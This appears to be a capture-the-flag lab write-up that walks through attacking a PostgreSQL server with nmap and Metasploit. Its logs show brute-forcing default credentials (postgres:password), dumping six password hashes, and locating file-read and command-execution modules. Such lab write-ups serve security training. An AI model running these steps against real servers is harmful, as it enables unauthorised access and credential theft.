- http://thm.box.ip
- reveals an email signup box

- the basic command injection that I tried didn't reveal anything. 
- I used an actual email address and clicked sign up and nothing came to my inbox
# What is the rdbms installed on the server?
# What port is the rdbms running on?
- nmap scan to probe the box network reveals the rdbms postgresql running on port 5432
```bash
┌─(kali㉿kali)-[~]
└─$ sudo nmap -p- -T4 -vv -O --min-rate 20000 -Pn 10.10.118.139
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 03:24 EDT
Initiating Parallel DNS resolution of 1 host. at 03:24
Completed Parallel DNS resolution of 1 host. at 03:24, 0.03s elapsed
Initiating SYN Stealth Scan at 03:24
Scanning 10.10.118.139 [65535 ports]
Discovered open port 22/tcp on 10.10.118.139
Discovered open port 80/tcp on 10.10.118.139
Increasing send delay for 10.10.118.139 from 0 to 5 due to 1669 out of 4171 dropped probes since last increase.
Increasing send delay for 10.10.118.139 from 5 to 10 due to 817 out of 2041 dropped probes since last increase.
Warning: 10.10.118.139 giving up on port because retransmission cap hit (6).
Discovered open port 5432/tcp on 10.10.118.139
Completed SYN Stealth Scan at 03:24, 11.63s elapsed (65535 total ports)
Initiating OS detection (try #1) against 10.10.118.139
Retrying OS detection (try #2) against 10.10.118.139
Retrying OS detection (try #3) against 10.10.118.139
Retrying OS detection (try #4) against 10.10.118.139
Retrying OS detection (try #5) against 10.10.118.139
Nmap scan report for 10.10.118.139
Host is up, received user-set (0.10s latency).
Scanned at 2023-10-14 03:24:44 EDT for 24s
Not shown: 61230 closed tcp ports (reset), 4302 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 61
80/tcp   open  http       syn-ack ttl 61
5432/tcp open  postgresql syn-ack ttl 61
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/14%OT=22%CT=1%CU=35795%PV=Y%DS=4%DC=I%G=Y%TM=652A42
OS:54%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST
OS:11NW7%O6=M509ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 0.013 days (since Sat Oct 14 03:07:03 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.25 seconds
           Raw packets sent: 221522 (9.751MB) | Rcvd: 69886 (2.799MB)
```

# After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?
- fire up Metasploit - and searching for postgres
- auxiliary module that allows us to enumerate user credentials
- #9 auxiliary/scanner/postgres/postgres_login PostgreSQL Login Utility
```bash
msf6 > search postgres

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   4   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   7   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   8   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection
   9   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility
```

- use 9 - Set module to 9 
- set -g rhosts ipaddr set the LHOSTS option globally across modules
```bash
msf6 > use 9
msf6 auxiliary(scanner/postgres/postgres_login) > options
msf6 auxiliary(scanner/postgres/postgres_login) > set -g rhosts 10.10.78.111
sf6 auxiliary(scanner/postgres/postgres_login) > options

Module options (auxiliary/scanner/postgres/postgres_login):
   Name              Current Setting                                     Required  Description
   ----              ---------------                                     --------  -----------
   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                                           yes       The database to authenticate against
   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                              no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/pos  no        File containing passwords, one per line
                     tgres_default_pass.txt
   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
   RETURN_ROWSET     true                                                no        Set to true to see query result sets
   RHOSTS                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
                                                                                   ploit.html
   RPORT             5432                                                yes       The target port
   STOP_ON_SUCCESS   false                                               yes       Stop guessing when a credential works for a host
   THREADS           1                                                   yes       The number of concurrent threads (max one per host)
   USERNAME                                                              no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/pos  no        File containing (space-separated) users and passwords, one pair per line
                     tgres_default_userpass.txt
   USER_AS_PASS      false                                               no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/pos  no        File containing users, one per line
                     tgres_default_user.txt
   VERBOSE           true                                                yes       Whether to print output for all attempts
```

# What are the credentials you found?
- exploit / executes the module with the options you set
- reveals successful login with the credentials postgres:password
```bash
msf6 auxiliary(scanner/postgres/postgres_login) > exploit

[!] No active DB -- Credential data will not be saved!
[-] 10.10.51.200:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.51.200:5432 - Login Successful: postgres:password@template1
[-] 10.10.51.200:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.51.200:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?
- search  for postgres
- #11 auxiliary/admin/postgres/postgres_sql
- This module will reveal the postgresql rdbms version installed
```bash
msf6 auxiliary(scanner/postgres/postgres_login) > search postgres

Matching Modules
================
   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   11  auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
```
 - use 11, options, set required fields user name and password
```bash
sf6 auxiliary(scanner/postgres/postgres_login) > use 11
msf6 auxiliary(admin/postgres/postgres_sql) > options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   DATABASE       template1         yes       The database to authenticate against
   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
   RETURN_ROWSET  true              no        Set to true to see query result sets
   RHOSTS         10.10.51.200      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          5432              yes       The target port
   SQL            select version()  no        The SQL query to execute
   USERNAME       postgres          yes       The username to authenticate as
   VERBOSE        false             no        Enable verbose output
msf6 auxiliary(admin/postgres/postgres_sql) > set username postgres
username => postgres
msf6 auxiliary(admin/postgres/postgres_sql) > set password password
password => password
```
- exploit 
- reveals PostgreSQL 9.5.21 version
```bash
msf6 auxiliary(admin/postgres/postgres_sql) > exploit
[*] Running module against 10.10.51.200

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
```

# What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?
-  #15 auxiliary/scanner/postgres/postgres_hashdump
```bash
msf6 auxiliary(admin/postgres/postgres_sql) > search postgre

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   4   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   7   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   8   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection
   9   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility
   10  auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query
   11  auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
   12  auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe
   13  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   14  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   15  auxiliary/scanner/postgres/postgres_hashdump                                 normal     No     Postgres Password Hashdump
```
- use #15 and check options
- set password to password
- and exploit
```bash
msf6 auxiliary(admin/postgres/postgres_sql) > use 15
msf6 auxiliary(scanner/postgres/postgres_hashdump) > options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS    10.10.51.200     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432             yes       The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         yes       The username to authenticate as
```
- msf6 auxiliary(scanner/postgres/postgres_hashdump) > set password password
- password => password
# How many user hashes does the module dump? 
- 6
```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > exploit

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?
- #10 auxiliary/admin/postgres/postgres_readfile
```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > search postgres

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   4   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   7   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   8   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection
   9   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility
   10  auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query
```

# What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?
- #6 exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```bash
msf6 > search postgres

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   4   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
```




